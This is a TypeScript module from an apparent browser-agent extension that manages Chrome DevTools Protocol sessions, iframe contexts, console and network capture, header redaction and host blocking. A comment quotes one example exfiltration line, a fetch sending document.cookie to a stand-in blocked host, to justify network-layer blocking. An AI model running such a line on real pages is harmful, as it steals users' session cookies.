/**
 * Chrome DevTools Protocol session manager.
 *
 * Everything the agent does to a page used to be a synthetic DOM event
 * (`el.dispatchEvent(new MouseEvent(...))`), which arrives with `isTrusted:
 * false`. Native form submission, drag-and-drop, canvas apps and every anti-bot
 * check reject those. CDP's Input domain produces real, trusted input.
 *
 * Attachment is deliberately sticky: Chrome shows an "onbridge started debugging
 * this browser" infobar for as long as we are attached, and re-attaching per
 * command would make it flicker constantly. Staying attached while control mode
 * is on keeps it stable — and that banner is honest, unspoofable transparency
 * that something is driving the browser, so it is a feature, not a cost.
 */

const CDP_VERSION = '1.3';

/** Attach failures are expected and routine, not exceptional. */
export class CdpUnavailable extends Error {
  constructor(reason: string) {
    super(reason);
    this.name = 'CdpUnavailable';
  }
}

const attached = new Set<number>();
/** Tabs where attach failed; retrying every command would be pointless churn. */
const refused = new Map<number, string>();

/**
 * A main-world execution context, and the CDP session that owns it.
 *
 * `Runtime.evaluate` without a `contextId` only ever reaches the top frame, which
 * is why anything inside an iframe used to be unreachable by trusted input: the
 * ref was visible in the snapshot but the main world could not resolve it.
 *
 * Cross-origin iframes need the session as well as the context. They run in
 * their own process, and the tab-level session simply does not report them —
 * only `Target.setAutoAttach` surfaces them, as a child session with its own
 * context ids. Context ids are unique per session, not per tab, so a context is
 * only addressable as the pair.
 *
 * Only default (main-world) contexts are kept. Isolated worlds — including our
 * own content script's — share the DOM but not page globals, which is precisely
 * what `evaluate` must not run in.
 */
export interface World {
  contextId: number;
  /** Absent for frames sharing the top frame's process. */
  sessionId?: string;
}

const worldsByTab = new Map<number, Map<string, World>>();

const worldKey = (w: World) => `${w.sessionId ?? ''}:${w.contextId}`;

export function mainWorlds(tabId: number): World[] {
  return [...(worldsByTab.get(tabId)?.values() ?? [])];
}

export function hasWorld(tabId: number, world: World): boolean {
  return worldsByTab.get(tabId)?.has(worldKey(world)) ?? false;
}

function addWorld(tabId: number, world: World): void {
  const map = worldsByTab.get(tabId) ?? new Map<string, World>();
  map.set(worldKey(world), world);
  worldsByTab.set(tabId, map);
}

function dropSession(tabId: number, sessionId: string): void {
  const map = worldsByTab.get(tabId);
  if (!map) return;
  for (const [key, w] of map) if (w.sessionId === sessionId) map.delete(key);
}

export function isAttached(tabId: number): boolean {
  return attached.has(tabId);
}

export async function attach(tabId: number): Promise<void> {
  if (attached.has(tabId)) return;

  const priorFailure = refused.get(tabId);
  if (priorFailure) throw new CdpUnavailable(priorFailure);

  await new Promise<void>((resolve, reject) => {
    chrome.debugger.attach({ tabId }, CDP_VERSION, () => {
      const err = chrome.runtime.lastError;
      if (!err) return resolve();

      // Most common causes: DevTools is already open on this tab (only one
      // debugger client is allowed), or it is a restricted chrome:// page.
      const reason = err.message ?? 'debugger attach failed';
      refused.set(tabId, reason);
      reject(new CdpUnavailable(reason));
    });
  });

  attached.add(tabId);

  // Runtime must be enabled for `executionContextCreated` to arrive, and it
  // replays the contexts that already exist — which is the normal case, since we
  // attach on the first command rather than at page load.
  await send(tabId, 'Runtime.enable').catch(() => {});
  await autoAttach(tabId);
  await applyBlockedUrls(tabId);
}

/**
 * Denylisted hosts, as CDP URL patterns. Set by the background from policy.
 *
 * The navigation guards cannot see a subresource request: `fetch()` inside
 * `evaluate` reaches a blocked host without ever navigating, so nothing fires
 * `onBeforeNavigate` and neither the pre-check nor the post-check applies. That
 * is an exfiltration path — `fetch('https://blocked.test/?c=' + document.cookie)`
 * — and it is exactly the one the domain lists are meant to close. Blocking at
 * the network layer catches it wherever the request comes from, including script
 * the agent never named.
 *
 * Denylist only, deliberately: an allowlist here would block every third-party
 * subresource (CDNs, fonts, APIs) and break ordinary pages, which is a different
 * question from where the *browser* may go.
 */
let blockedUrlPatterns: string[] = [];

export function setBlockedUrlPatterns(patterns: string[]): void {
  blockedUrlPatterns = patterns;
  for (const tabId of attached) void applyBlockedUrls(tabId);
}

async function applyBlockedUrls(tabId: number): Promise<void> {
  if (blockedUrlPatterns.length === 0) return;
  await send(tabId, 'Network.enable').catch(() => {});
  await send(tabId, 'Network.setBlockedURLs', { urls: blockedUrlPatterns }).catch(() => {});
}

/**
 * Surfaces out-of-process iframes as child sessions.
 *
 * Without this a cross-origin frame is invisible: it is missing from the tab
 * session's context list entirely, so its elements cannot be resolved at all.
 */
async function autoAttach(tabId: number, sessionId?: string): Promise<void> {
  await send(
    tabId,
    'Target.setAutoAttach',
    { autoAttach: true, flatten: true, waitForDebuggerOnStart: false },
    sessionId,
  ).catch(() => {});
}

export function detach(tabId: number): void {
  if (!attached.has(tabId)) return;
  attached.delete(tabId);
  worldsByTab.delete(tabId);
  chrome.debugger.detach({ tabId }, () => void chrome.runtime.lastError);
}

export function detachAll(): void {
  for (const tabId of [...attached]) detach(tabId);
  refused.clear();
}

/** Lets a tab retry after the blocking condition (e.g. DevTools) has cleared. */
export function forgetRefusal(tabId: number): void {
  refused.delete(tabId);
}

export function send<T = any>(
  tabId: number,
  method: string,
  params: Record<string, unknown> = {},
  sessionId?: string,
): Promise<T> {
  // `sessionId` addresses a flattened child session (an out-of-process iframe).
  // @types/chrome has not caught up with it, hence the cast.
  const target = { tabId, ...(sessionId ? { sessionId } : {}) } as chrome.debugger.Debuggee;
  return new Promise((resolve, reject) => {
    chrome.debugger.sendCommand(target, method, params, (result) => {
      const err = chrome.runtime.lastError;
      if (err) {
        // A detach can happen underneath us (tab closed, user dismissed the
        // banner). Drop the stale bookkeeping so the next call re-attaches.
        if (/detached|not attached|No tab with given id/i.test(err.message ?? '')) {
          attached.delete(tabId);
        }
        return reject(new Error(err.message ?? `${method} failed`));
      }
      resolve(result as T);
    });
  });
}

export interface ConsoleEntry {
  level: string;
  text: string;
  url?: string;
  timestamp: number;
}

/**
 * Console output, captured per tab.
 *
 * The old `console_logs` tool returned an array that nothing ever wrote to — it
 * always answered with an empty list. There is no extension API for reading a
 * page's console, so this needs CDP.
 */
const consoleByTab = new Map<number, ConsoleEntry[]>();
const CONSOLE_LIMIT = 200;

/**
 * Entries evicted (or cleared) per tab, ever. Cursors are absolute positions in
 * the tab's full history — `dropped + buffer length` — so they stay valid while
 * the capped buffer shifts underneath them.
 */
const consoleDropped = new Map<number, number>();

export function getConsole(tabId: number): ConsoleEntry[] {
  return consoleByTab.get(tabId) ?? [];
}

export function clearConsole(tabId: number): void {
  // Cleared entries count as dropped: a cursor taken before the clear must keep
  // meaning "everything after that point", not resurrect pre-clear positions.
  const list = consoleByTab.get(tabId);
  if (list) consoleDropped.set(tabId, (consoleDropped.get(tabId) ?? 0) + list.length);
  consoleByTab.delete(tabId);
}

/** Current position in this tab's console log — an opaque cursor. */
export function consoleCursor(tabId: number): number {
  return (consoleDropped.get(tabId) ?? 0) + (consoleByTab.get(tabId)?.length ?? 0);
}

/**
 * Console entries recorded after `cursor`.
 *
 * The buffer is capped, so a cursor can point at entries already evicted. That
 * gap is unreportable — the entries are gone — so this returns everything that
 * remains rather than throwing or pretending nothing happened. The caller sees
 * at most CONSOLE_LIMIT entries either way.
 */
export function consoleSince(tabId: number, cursor: number): ConsoleEntry[] {
  const list = consoleByTab.get(tabId) ?? [];
  return list.slice(Math.max(0, cursor - (consoleDropped.get(tabId) ?? 0)));
}

function record(tabId: number, entry: ConsoleEntry): void {
  const list = consoleByTab.get(tabId) ?? [];
  list.push(entry);
  if (list.length > CONSOLE_LIMIT) {
    const excess = list.length - CONSOLE_LIMIT;
    list.splice(0, excess);
    consoleDropped.set(tabId, (consoleDropped.get(tabId) ?? 0) + excess);
  }
  consoleByTab.set(tabId, list);
}

/** Enables the domains that emit console and error events. */
export async function enableConsoleCapture(tabId: number): Promise<void> {
  // `attach` already enables Runtime; Log adds the browser-level warnings the
  // page itself never sees.
  await attach(tabId);
  await send(tabId, 'Log.enable').catch(() => {});
}

export interface NetworkEntry {
  requestId: string;
  url: string;
  method: string;
  resourceType?: string;
  status?: number;
  statusText?: string;
  mimeType?: string;
  /** Redacted — see below. */
  requestHeaders?: Record<string, string>;
  responseHeaders?: Record<string, string>;
  encodedDataLength?: number;
  startedAt: number;
  endedAt?: number;
  /** Set when the request failed; the CDP error text. */
  failed?: string;
  fromCache?: boolean;
}

/**
 * Network activity, captured per tab and correlated by requestId.
 *
 * A Map keyed by requestId doubles as the ordered buffer: insertion order is
 * request-start order, and late events (response, completion) mutate their
 * entry in place without reordering it.
 */
const networkByTab = new Map<number, Map<string, NetworkEntry>>();
const NETWORK_LIMIT = 200;

/**
 * Headers whose values never enter the buffer. Everything stored here flows
 * verbatim into the agent's context, and downstream layers cannot un-leak a
 * bearer token they were handed — so credentials are dropped at record time,
 * unconditionally, in the extension. The header *name* is kept: "there was an
 * Authorization header" is useful and harmless; its value is neither.
 */
const REDACTED_HEADERS = new Set([
  'authorization',
  'cookie',
  'set-cookie',
  'proxy-authorization',
  'x-api-key',
]);

function redactHeaders(headers: unknown): Record<string, string> | undefined {
  if (!headers || typeof headers !== 'object') return undefined;
  const out: Record<string, string> = {};
  for (const [name, value] of Object.entries(headers as Record<string, unknown>)) {
    out[name] = REDACTED_HEADERS.has(name.toLowerCase()) ? '[redacted]' : String(value);
  }
  return out;
}

/** Idempotent; safe to call on an already-capturing tab. */
export async function enableNetworkCapture(tabId: number): Promise<void> {
  // Network may already be enabled by the denylist (`applyBlockedUrls`); CDP
  // treats a repeat `Network.enable` as a no-op, and it does not disturb the
  // blocked-URL patterns already set on the session.
  await attach(tabId);
  await send(tabId, 'Network.enable').catch(() => {});
}

export function getNetwork(tabId: number): NetworkEntry[] {
  return [...(networkByTab.get(tabId)?.values() ?? [])];
}

export function clearNetwork(tabId: number): void {
  networkByTab.delete(tabId);
}

/** Null when the body is unavailable (evicted, no body, or tab gone). */
export async function getResponseBody(
  tabId: number,
  requestId: string,
): Promise<{ body: string; base64Encoded: boolean } | null> {
  try {
    const r = await send<{ body: string; base64Encoded: boolean }>(
      tabId,
      'Network.getResponseBody',
      { requestId },
    );
    return { body: r.body, base64Encoded: r.base64Encoded };
  } catch {
    // CDP evicts bodies from its own buffer, some responses have none, and the
    // tab may have detached — all routine, none worth surfacing as a throw.
    return null;
  }
}

function recordRequest(tabId: number, entry: NetworkEntry): void {
  const map = networkByTab.get(tabId) ?? new Map<string, NetworkEntry>();
  map.set(entry.requestId, entry);
  // Every page load appends here; without a cap this is a memory-growth
  // primitive. Oldest first, same bound as the console buffer.
  if (map.size > NETWORK_LIMIT) {
    for (const key of map.keys()) {
      map.delete(key);
      if (map.size <= NETWORK_LIMIT) break;
    }
  }
  networkByTab.set(tabId, map);
}

chrome.debugger.onEvent.addListener((source, method, params) => {
  const tabId = source.tabId;
  if (tabId == null) return;
  const p = params as any;

  const sessionId = (source as { sessionId?: string }).sessionId;

  if (method === 'Target.attachedToTarget') {
    const child = p.sessionId as string;
    // A newly surfaced frame reports nothing until Runtime is enabled on its own
    // session, and it may itself contain further out-of-process frames.
    void send(tabId, 'Runtime.enable', {}, child).catch(() => {});
    void autoAttach(tabId, child);
    return;
  }
  if (method === 'Target.detachedFromTarget') {
    dropSession(tabId, p.sessionId as string);
    return;
  }
  if (method === 'Runtime.executionContextCreated') {
    if (p.context?.auxData?.isDefault) addWorld(tabId, { contextId: p.context.id, sessionId });
    return;
  }
  if (method === 'Runtime.executionContextDestroyed') {
    worldsByTab.get(tabId)?.delete(`${sessionId ?? ''}:${p.executionContextId}`);
    return;
  }
  if (method === 'Runtime.executionContextsCleared') {
    // Sent on cross-document navigation: every ref and context is now stale.
    if (sessionId) dropSession(tabId, sessionId);
    else worldsByTab.delete(tabId);
    return;
  }

  if (method === 'Network.requestWillBeSent') {
    // A redirect re-sends the same requestId; keeping the original start time
    // makes the entry describe the whole chain, ending at the final URL.
    const prior = networkByTab.get(tabId)?.get(p.requestId);
    recordRequest(tabId, {
      requestId: p.requestId,
      url: p.request?.url ?? '',
      method: p.request?.method ?? 'GET',
      resourceType: p.type,
      requestHeaders: redactHeaders(p.request?.headers),
      startedAt: prior?.startedAt ?? Date.now(),
    });
    return;
  }
  if (method === 'Network.responseReceived') {
    const e = networkByTab.get(tabId)?.get(p.requestId);
    if (!e) return;
    e.status = p.response?.status;
    e.statusText = p.response?.statusText;
    e.mimeType = p.response?.mimeType;
    e.responseHeaders = redactHeaders(p.response?.headers);
    // The response event carries the headers as actually sent on the wire,
    // which includes what the browser added after requestWillBeSent.
    if (p.response?.requestHeaders) e.requestHeaders = redactHeaders(p.response.requestHeaders);
    if (p.response?.fromDiskCache || p.response?.fromPrefetchCache) e.fromCache = true;
    return;
  }
  if (method === 'Network.loadingFinished') {
    const e = networkByTab.get(tabId)?.get(p.requestId);
    if (!e) return;
    e.endedAt = Date.now();
    e.encodedDataLength = p.encodedDataLength;
    return;
  }
  if (method === 'Network.loadingFailed') {
    const e = networkByTab.get(tabId)?.get(p.requestId);
    if (!e) return;
    e.endedAt = Date.now();
    e.failed = p.errorText || 'failed';
    return;
  }
  if (method === 'Network.requestServedFromCache') {
    const e = networkByTab.get(tabId)?.get(p.requestId);
    if (e) e.fromCache = true;
    return;
  }

  if (method === 'Runtime.consoleAPICalled') {
    record(tabId, {
      level: p.type ?? 'log',
      text: (p.args ?? [])
        .map((a: any) => a.value ?? a.description ?? a.unserializableValue ?? '')
        .join(' ')
        .slice(0, 2000),
      timestamp: Date.now(),
    });
  } else if (method === 'Runtime.exceptionThrown') {
    const d = p.exceptionDetails ?? {};
    record(tabId, {
      level: 'error',
      text: (d.exception?.description ?? d.text ?? 'Uncaught exception').slice(0, 2000),
      url: d.url,
      timestamp: Date.now(),
    });
  } else if (method === 'Log.entryAdded') {
    // Network/security/deprecation warnings the page itself never sees.
    record(tabId, {
      level: p.entry?.level ?? 'info',
      text: (p.entry?.text ?? '').slice(0, 2000),
      url: p.entry?.url,
      timestamp: Date.now(),
    });
  }
});

// Chrome tears the session down on navigation-ish events; keep state honest.
chrome.debugger.onDetach.addListener((source) => {
  if (source.tabId == null) return;
  attached.delete(source.tabId);
  worldsByTab.delete(source.tabId);
  networkByTab.delete(source.tabId);
});

// The network log describes one page, so it resets when the tab leaves it.
// onBeforeNavigate rather than a CDP signal, because it fires before the new
// document's own request starts — clearing on `executionContextsCleared` would
// arrive after that request and silently drop the new page's first entry.
chrome.webNavigation.onBeforeNavigate.addListener((details) => {
  if (details.frameId === 0) networkByTab.delete(details.tabId);
});

chrome.tabs.onRemoved.addListener((tabId) => {
  attached.delete(tabId);
  refused.delete(tabId);
  consoleByTab.delete(tabId);
  consoleDropped.delete(tabId);
  networkByTab.delete(tabId);
  worldsByTab.delete(tabId);
});
